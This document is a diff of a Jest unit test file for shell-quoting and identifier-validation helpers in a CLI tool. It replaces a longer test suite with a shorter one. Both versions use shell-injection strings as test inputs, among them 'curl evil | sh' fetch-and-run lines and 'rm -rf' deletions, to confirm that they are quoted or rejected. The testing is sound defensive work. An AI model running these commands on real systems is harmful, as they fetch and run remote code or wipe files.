@@ -1,230 +1,67 @@
-/**
- * Unit Tests for lib/shell-quote.ts
- *
- * Verifies that posixShellQuote, fishShellQuote, and assertSafeId neutralise
- * shell metacharacters for eval-emitted export lines, and that formatExportLines
- * (cli/commands/sugar.ts) produces correctly-quoted output for both POSIX and
- * fish shells.
- */
-
-import { describe, it, expect } from '@jest/globals';
-import { posixShellQuote, fishShellQuote, assertSafeId } from '../../lib/shell-quote.js';
-import { formatExportLines } from '../../cli/commands/sugar.js';
-
-// ---------------------------------------------------------------------------
-// posixShellQuote
-// ---------------------------------------------------------------------------
+import { describe, test, expect } from '@jest/globals';
+import { assertSafeId, posixShellQuote, fishShellQuote } from '../../lib/shell-quote.js';
 
 describe('posixShellQuote', () => {
-  it('wraps a plain value in single quotes', () => {
-    expect(posixShellQuote('hello')).toBe("'hello'");
+  test('plain alphanumeric is single-quoted unchanged', () => {
+    expect(posixShellQuote('abc123')).toBe("'abc123'");
   });
 
-  it('wraps value with spaces safely', () => {
-    expect(posixShellQuote('hello world')).toBe("'hello world'");
+  test('single quote inside is escaped as the POSIX idiom', () => {
+    expect(posixShellQuote("it's")).toBe("'it'\\''s'");
   });
 
-  it('neutralises semicolons (command separator)', () => {
-    const quoted = posixShellQuote(';rm -rf ~');
-    // semicolon must be inside the quotes, not bare
-    expect(quoted).toBe("';rm -rf ~'");
-  });
-
-  it('neutralises $() command substitution', () => {
-    const quoted = posixShellQuote('$(curl evil | sh)');
-    expect(quoted).toBe("'$(curl evil | sh)'");
-  });
-
-  it('neutralises backtick command substitution', () => {
-    const quoted = posixShellQuote('`rm -rf /`');
-    expect(quoted).toBe("'`rm -rf /`'");
-  });
-
-  it('neutralises single-quote injection attempt', () => {
-    const malicious = "x' && evil #";
-    const quoted = posixShellQuote(malicious);
-    // The single-quote in the value must be escaped with the '\'' sequence
-    expect(quoted).toBe("'x'\\'' && evil #'");
-    // The resulting token, parsed by a POSIX shell, yields the original value.
-    // We verify the structural invariant: no unbalanced bare metacharacters.
-    // The injection character ' is safely inside the quoted sequence.
-    expect(quoted).toContain("'\\''");
-  });
-
-  it('round-trips a value containing a single-quote', () => {
-    const value = "it's alive";
-    const quoted = posixShellQuote(value);
-    expect(quoted).toBe("'it'\\''s alive'");
-    // The shell sequence 'it'\''s alive' parses as: it + ' + s alive → "it's alive"
-    // We verify this by checking the sequence is structurally correct.
-    // 1. Starts and ends with quote boundary markers
-    expect(quoted.startsWith("'")).toBe(true);
-    expect(quoted.endsWith("'")).toBe(true);
-    // 2. Contains the POSIX single-quote escape sequence
-    expect(quoted).toContain("'\\''");
-  });
-
-  it('is byte-identical to the former daemon.ts shellQuote for normal inputs', () => {
-    // The local shellQuote that lived in cli/commands/daemon.ts was:
-    //   return `'${value.replace(/'/g, "'\\''")}'`;
-    // posixShellQuote must be identical.
-    const formerImpl = (v) => `'${v.replace(/'/g, "'\\''")}'`;
-    const testValues = [
-      '/home/user/.port-daddy/runtime',
-      '/Users/erich/Library/Application Support/pd',
-      'my-profile-name',
-      "path'with'quotes",
-      'x;y && z || w',
-    ];
-    for (const v of testValues) {
-      expect(posixShellQuote(v)).toBe(formerImpl(v));
+  test('shell metacharacters are neutralised', () => {
+    for (const meta of ['$VAR', '`cmd`', '$(cmd)', '; rm -rf /', '&& evil']) {
+      const quoted = posixShellQuote(meta);
+      // Must be wrapped in single quotes — nothing else neutralises these.
+      expect(quoted.startsWith("'")).toBe(true);
+      expect(quoted.endsWith("'")).toBe(true);
     }
   });
 });
 
-// ---------------------------------------------------------------------------
-// fishShellQuote
-// ---------------------------------------------------------------------------
-
 describe('fishShellQuote', () => {
-  it('wraps a plain value in single quotes', () => {
+  test('plain value is single-quoted unchanged', () => {
     expect(fishShellQuote('hello')).toBe("'hello'");
   });
 
-  it('wraps value with spaces safely', () => {
-    expect(fishShellQuote('hello world')).toBe("'hello world'");
+  test('single quote is escaped with backslash (fish rule)', () => {
+    expect(fishShellQuote("it's")).toBe("'it\\'s'");
   });
 
-  it('neutralises semicolons', () => {
-    expect(fishShellQuote(';rm -rf ~')).toBe("';rm -rf ~'");
-  });
-
-  it('neutralises $() command substitution', () => {
-    expect(fishShellQuote('$(curl evil | sh)')).toBe("'$(curl evil | sh)'");
-  });
-
-  it('neutralises backtick command substitution', () => {
-    expect(fishShellQuote('`rm -rf /`')).toBe("'`rm -rf /`'");
-  });
-
-  it('escapes single-quotes with backslash (fish style)', () => {
-    const malicious = "x' && evil #";
-    const quoted = fishShellQuote(malicious);
-    // In fish single-quoted strings, ' is escaped as \'
-    expect(quoted).toBe("'x\\' && evil #'");
-  });
-
-  it('escapes backslashes before escaping single-quotes', () => {
-    // A backslash in the value must be doubled
-    const quoted = fishShellQuote('a\\b');
-    expect(quoted).toBe("'a\\\\b'");
-  });
-
-  it('escapes both backslash and single-quote in combination', () => {
-    const quoted = fishShellQuote("a\\'b");
-    // \ → \\, then ' → \'
-    expect(quoted).toBe("'a\\\\\\'b'");
+  test('backslash is doubled', () => {
+    expect(fishShellQuote('a\\b')).toBe("'a\\\\b'");
   });
 });
-
-// ---------------------------------------------------------------------------
-// assertSafeId
-// ---------------------------------------------------------------------------
 
 describe('assertSafeId', () => {
-  it('does not throw for a normal alphanumeric id', () => {
-    expect(() => assertSafeId('agent-abc123', 'agentId')).not.toThrow();
+  test('valid UUIDs and semantic identities pass', () => {
+    const valid = [
+      'abc123',
+      'project:stack:context',
+      'a-b-c/d_e.f',
+      '550e8400-e29b-41d4-a716-446655440000',
+    ];
+    for (const v of valid) {
+      expect(() => assertSafeId(v, 'test')).not.toThrow();
+    }
   });
 
-  it('does not throw for an id with hyphens and underscores', () => {
-    expect(() => assertSafeId('my-agent_v1', 'agentId')).not.toThrow();
+  test('spaces throw', () => {
+    expect(() => assertSafeId('hello world', 'agentId')).toThrow(/agentId/);
   });
 
-  it('throws for a value containing a newline (\\n)', () => {
-    expect(() => assertSafeId('agent\n;rm -rf ~', 'agentId')).toThrow(/control character/);
+  test('shell metacharacters throw', () => {
+    for (const bad of ['$(cmd)', '`cmd`', '; rm', '&& evil', '\n']) {
+      expect(() => assertSafeId(bad, 'agentId')).toThrow();
+    }
   });
 
-  it('throws for a value containing NUL (\\x00)', () => {
-    expect(() => assertSafeId('agent\x00id', 'sessionId')).toThrow(/control character/);
+  test('empty string throws', () => {
+    expect(() => assertSafeId('', 'sessionId')).toThrow(/sessionId/);
   });
 
-  it('throws for a value containing carriage return (\\r)', () => {
-    expect(() => assertSafeId('agent\r', 'agentId')).toThrow(/control character/);
-  });
-
-  it('throws for a value containing DEL (\\x7F)', () => {
-    expect(() => assertSafeId('agent\x7f', 'agentId')).toThrow(/control character/);
-  });
-
-  it('includes the fieldName in the error message', () => {
-    expect(() => assertSafeId('bad\nid', 'myField')).toThrow(/myField/);
-  });
-
-  it('does not throw for shell metacharacters (they are safe with quoting)', () => {
-    // These are dangerous unquoted but safe after shell-quoting — assertSafeId
-    // only guards against control chars that could break quoting itself.
-    expect(() => assertSafeId("x;curl evil|sh", 'agentId')).not.toThrow();
-    expect(() => assertSafeId("$(evil)", 'agentId')).not.toThrow();
-    expect(() => assertSafeId("x' && evil #", 'agentId')).not.toThrow();
-  });
-});
-
-// ---------------------------------------------------------------------------
-// formatExportLines (cli/commands/sugar.ts)
-// ---------------------------------------------------------------------------
-
-describe('formatExportLines', () => {
-  it('emits POSIX export lines for bash', () => {
-    const lines = formatExportLines('/bin/bash', { agentId: 'abc123', sessionId: 'sess456' });
-    expect(lines).toHaveLength(2);
-    expect(lines[0]).toBe("export PD_AGENT_ID='abc123'");
-    expect(lines[1]).toBe("export PD_SESSION_ID='sess456'");
-  });
-
-  it('emits POSIX export lines for zsh', () => {
-    const lines = formatExportLines('/bin/zsh', { agentId: 'abc123', sessionId: 'sess456' });
-    expect(lines[0]).toBe("export PD_AGENT_ID='abc123'");
-  });
-
-  it('emits POSIX export lines for empty shell string', () => {
-    const lines = formatExportLines('', { agentId: 'abc123', sessionId: 'sess456' });
-    expect(lines[0]).toBe("export PD_AGENT_ID='abc123'");
-  });
-
-  it('emits fish set -x lines for /usr/local/bin/fish', () => {
-    const lines = formatExportLines('/usr/local/bin/fish', { agentId: 'abc123', sessionId: 'sess456' });
-    expect(lines).toHaveLength(2);
-    expect(lines[0]).toBe("set -x PD_AGENT_ID 'abc123'");
-    expect(lines[1]).toBe("set -x PD_SESSION_ID 'sess456'");
-  });
-
-  it('emits fish set -x lines for /opt/homebrew/bin/fish', () => {
-    const lines = formatExportLines('/opt/homebrew/bin/fish', { agentId: 'my-agent', sessionId: 'my-session' });
-    expect(lines[0]).toMatch(/^set -x PD_AGENT_ID /);
-  });
-
-  it('neutralises injection in POSIX export — semicolon in agentId', () => {
-    const lines = formatExportLines('/bin/zsh', { agentId: 'x;curl evil|sh', sessionId: 's' });
-    expect(lines[0]).toBe("export PD_AGENT_ID='x;curl evil|sh'");
-    // The dangerous ; is inside the single quotes — injection neutralised.
-    expect(lines[0]).not.toMatch(/PD_AGENT_ID=x;/);
-  });
-
-  it('neutralises injection in fish export — single-quote in agentId', () => {
-    const lines = formatExportLines('/usr/bin/fish', { agentId: "it's", sessionId: 's' });
-    // In fish quoting, ' becomes \'
-    expect(lines[0]).toBe("set -x PD_AGENT_ID 'it\\'s'");
-  });
-
-  it('throws when agentId contains a newline', () => {
-    expect(() =>
-      formatExportLines('/bin/zsh', { agentId: 'agent\n;evil', sessionId: 's' })
-    ).toThrow(/control character/);
-  });
-
-  it('throws when sessionId contains a newline', () => {
-    expect(() =>
-      formatExportLines('/bin/zsh', { agentId: 'a', sessionId: 'sess\n;evil' })
-    ).toThrow(/control character/);
+  test('value over 256 chars throws', () => {
+    expect(() => assertSafeId('a'.repeat(257), 'agentId')).toThrow();
   });
 });
